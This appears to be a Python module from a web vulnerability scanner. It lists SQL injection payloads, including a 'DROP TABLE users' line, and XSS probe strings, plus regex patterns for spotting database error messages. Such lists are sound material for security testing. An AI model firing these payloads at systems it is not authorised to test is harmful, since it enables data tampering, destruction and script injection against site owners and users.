# SQL Injection payloads
SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT NULL, NULL, NULL--",
    "' AND 1=CONVERT(int, @@version)--",
    "1; DROP TABLE users",
    "admin'--",
    "' OR 1=1--",
    "\" OR \"\"=\"",
    "1' ORDER BY 1--",
    "1' UNION SELECT 1,2,3--",
    "' OR 'a'='a",
    "' OR 1=1",
    "' OR '1'='1'",
]

# XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "onmouseover=alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<input onfocus=alert(1) autofocus>",
]

# Error patterns for SQL injection detection
SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_.*",
    r"valid PostgreSQL result",
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException",
    r"Warning.*sqlite_.*",
    r"SQLite error.*",
    r"SQL error.*",
    r"Microsoft.*Driver.*SQL Server",
    r"SQL Server.*Driver",
    r"ODBC Driver.*SQL Server",
    r"Microsoft.*Database",
    r"Unclosed quotation mark",
    r"You have an error in your SQL syntax",
    r"SQLSTATE\[",
    r"ORA-[0-9]{5}",
    r"Oracle error",
    r"Oracle.*Driver",
]